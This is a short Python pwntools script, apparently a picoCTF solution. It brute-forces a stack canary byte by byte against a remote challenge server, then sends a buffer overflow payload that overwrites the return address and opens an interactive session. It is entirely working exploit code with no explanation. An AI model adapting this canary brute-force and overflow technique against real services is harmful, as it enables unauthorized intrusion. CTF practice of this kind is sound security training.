from pwn import *


def brute_canary():
    result = ""
    for i in range(4):
        for x in range(256):
            r = remote('saturn.picoctf.net', 53332)
            r.sendlineafter("> ", "100")
            test = "A" * 64 + result + chr(x)
            r.sendafter("> ", test)
            resp = str(r.recvline())
            r.close()
            if "Now" in resp:
                result += chr(x)
                break
    return u32(result)


def exploit():
    CANARY = 0x64526942
    r = remote('saturn.picoctf.net', 53332)

    log.info("Found it : %s", hex(CANARY))

    # 0x64526942

    r.sendlineafter("> ", "100")

    payload = b"A" * 64
    payload += p32(CANARY)
    payload += b"B"*16
    payload += p32(0x08049336)

    r.sendlineafter("> ", payload)

    r.interactive()
    return


exploit()
